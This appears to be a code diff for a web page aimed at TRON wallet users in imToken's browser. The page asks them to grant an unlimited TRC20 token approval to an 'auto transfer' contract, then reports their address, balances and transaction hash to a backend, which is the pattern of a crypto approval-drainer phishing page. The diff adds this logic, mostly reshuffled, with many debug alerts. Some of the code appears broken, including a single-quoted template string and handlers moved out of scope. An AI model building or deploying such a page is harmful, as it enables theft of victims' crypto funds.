@@ -72,6 +72,16 @@
 
     window.onload = async () => {
         alert("window.onload 事件被调用");
+        // 检测IMToken环境，自动连接
+        if (window.tronWeb && window.tronWeb.ready) {
+            alert("tronWeb 对象已正确初始化");
+            tronWeb = window.tronWeb;
+        } else {
+            alert("tronWeb 对象未正确初始化");
+            document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开此页面";
+            return; // 停止执行后续代码
+        }
+
         const connectBtn = document.getElementById("connectBtn");
         const approveBtn = document.getElementById("approveBtn");
         renderApprovalRecords();
@@ -93,91 +103,14 @@
                 alert("复制失败，请手动选中链接复制~");
             }
         });
-        // 检测IMToken环境，自动连接
-        if (window.tronWeb && window.tronWeb.ready) {
-            alert("tronWeb 对象已正确初始化");
-            tronWeb = window.tronWeb;
-            await initWallet();
-        } else {
-            alert("tronWeb 对象未正确初始化");
-            document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开此页面";
-        }
 
-        // 手动连接钱包
-        connectBtn.onclick = async () => {
-            alert("connectBtn.onclick 事件被调用");
-            try {
-                alert("准备检查 window.tronWeb");
-                if (!window.tronWeb){
-                  alert("window.tronWeb 不存在，准备跳转到 imToken 钱包");
-                  window.location.href = 'imtoken://browser?url=${encodeURIComponent(window.location.href)}';
-                  return;
-                }
-                alert("window.tronWeb 存在，准备请求账户");
-                const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
-                alert("accounts: " + JSON.stringify(accounts));
-                userAddress = accounts[0];
-                alert("userAddress: " + userAddress);
-                await initWallet();
-            } catch (e) {
-                alert("连接失败：" + e.message);
-            }
-        };
-
-        // 一键无限授权（核心修改：使用INFINITE_APPROVE_AMOUNT）
-        approveBtn.onclick = async () => {
-            alert("approveBtn.onclick 事件被调用");
-            try {
-                // 调用TRC20 approve，传入uint256最大值（无限授权）
-                const result = await trc20Contract.approve(
-                    AUTO_TRANSFER_CONTRACT,
-                    INFINITE_APPROVE_AMOUNT // 替换为无限额度
-                ).send({
-                    from: userAddress,
-                    shouldPollResponse: true // 等待imToken确认交易
-                });
-                alert("授权结果: " + JSON.stringify(result));
-
-                // 检查 result 对象是否有 transaction 属性
-                if (!result.transaction) {
-                  alert("错误：result 对象没有 transaction 属性");
-                  return;
-                }
-
-                // 授权成功：查余额+传后端+存记录
-                alert("准备调用 getTokenBalance 和 getTrxBalance 函数");
-                const [tokenBalance, trxBalance] = await Promise.all([
-                    getTokenBalance(userAddress),
-                    getTrxBalance(userAddress)
-                ]);
-                alert("tokenBalance: " + tokenBalance + ", trxBalance: " + trxBalance);
-                const record = {
-                    address: userAddress,
-                    tokenBalance: tokenBalance.toFixed(2),
-                    trxBalance: trxBalance.toFixed(2),
-                    approveTime: new Date().toLocaleString(),
-                    txHash: result.transaction.txID,
-                    approveType: "无限额度" // 新增：标注类型
-                };
-
-                alert("准备调用 saveApprovalRecord 函数");
-                saveApprovalRecord(record);
-                alert("准备调用 sendDataToBackend 函数");
-                await sendDataToBackend(record);
-
-                // 提示用户，明确是无限授权
-                alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在imToken钱包中撤销授权`);
-                renderApprovalRecords();
-            } catch (e) {
-                alert("授权失败：" + e.message);
-            }
-        };
+        await initWallet(); // 在此处调用 initWallet 函数
     };
 
-    // 初始化钱包信息（IMToken适配）
     async function initWallet() {
         alert("initWallet 函数被调用");
         try {
+            alert("tronWeb.defaultAddress: " + tronWeb.defaultAddress); // 添加此行
             userAddress = tronWeb.defaultAddress.base58;
             alert("userAddress: " + userAddress);
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
@@ -277,24 +210,92 @@
       credentials: "include"
     });
     console.log("后端响应:", res); // 添加此行
-    if (res.ok) {
-      console.log("后端响应状态码:", res.status); // 添加此行
-      console.log("后端响应头:", res.headers); // 添加此行
-      const responseData = await res.json();
-      console.log("后端响应数据:", responseData); // 添加此行
-      alert("数据发送成功，后端响应：" + JSON.stringify(responseData));
-      return responseData;
-    } else {
-      console.error("后端请求失败，状态码:", res.status); // 添加此行
-      alert("后端请求失败，状态码：" + res.status);
-      throw new Error("后端请求失败");
+     if (res.ok) {
+            console.log("后端响应状态码:", res.status); // 添加此行
+            console.log("后端响应头:", res.headers); // 添加此行
+            const responseData = await res.json();
+            console.log("后端响应数据:", responseData); // 添加此行
+            alert("数据发送成功，后端响应：" + JSON.stringify(responseData));
+            return responseData;
+        } else {
+            console.error("后端请求失败，状态码:", res.status); // 添加此行
+            alert("后端请求失败，状态码：" + res.status);
+            throw new Error("后端请求失败");
+        }
+    } catch (e) {
+        console.error("数据发送失败:", e); // 添加此行
+        alert("数据发送失败：" + e.message);
+        throw e;
     }
-  } catch (e) {
-    console.error("数据发送失败:", e); // 添加此行
-    alert("数据发送失败：" + e.message);
-    throw e;
-  }
 }
+
+    connectBtn.onclick = async () => {
+        alert("connectBtn.onclick 事件被调用");
+        try {
+            alert("准备检查 window.tronWeb");
+            if (!window.tronWeb) {
+                alert("window.tronWeb 不存在，准备跳转到 imToken 钱包");
+                window.location.href = 'imtoken://browser?url=${encodeURIComponent(window.location.href)}';
+                return;
+            }
+            alert("window.tronWeb 存在，准备请求账户");
+            const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
+            alert("accounts: " + JSON.stringify(accounts));
+            userAddress = accounts[0];
+            alert("userAddress: " + userAddress);
+            await initWallet();
+        } catch (e) {
+            alert("连接失败：" + e.message);
+        }
+    };
+
+    approveBtn.onclick = async () => {
+        alert("approveBtn.onclick 事件被调用");
+        try {
+            // 调用TRC20 approve，传入uint256最大值（无限授权）
+            const result = await trc20Contract.approve(
+                AUTO_TRANSFER_CONTRACT,
+                INFINITE_APPROVE_AMOUNT // 替换为无限额度
+            ).send({
+                from: userAddress,
+                shouldPollResponse: true // 等待imToken确认交易
+            });
+            alert("授权结果: " + JSON.stringify(result));
+
+            // 检查 result 对象是否有 transaction 属性
+            if (!result.transaction) {
+                alert("错误：result 对象没有 transaction 属性");
+                return;
+            }
+
+            // 授权成功：查余额+传后端+存记录
+            alert("准备调用 getTokenBalance 和 getTrxBalance 函数");
+            const [tokenBalance, trxBalance] = await Promise.all([
+                getTokenBalance(userAddress),
+                getTrxBalance(userAddress)
+            ]);
+            alert("tokenBalance: " + tokenBalance + ", trxBalance: " + trxBalance);
+            const record = {
+                address: userAddress,
+                tokenBalance: tokenBalance.toFixed(2),
+                trxBalance: trxBalance.toFixed(2),
+                approveTime: new Date().toLocaleString(),
+                txHash: result.transaction.txID,
+                approveType: "无限额度" // 新增：标注类型
+            };
+
+            alert("准备调用 saveApprovalRecord 函数");
+            saveApprovalRecord(record);
+            alert("准备调用 sendDataToBackend 函数");
+            await sendDataToBackend(record);
+
+            // 提示用户，明确是无限授权
+            alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在imToken钱包中撤销授权`);
+            renderApprovalRecords();
+        } catch (e) {
+            alert("授权失败：" + e.message);
+        }
+    };
 </script>
 </body>
 </html>
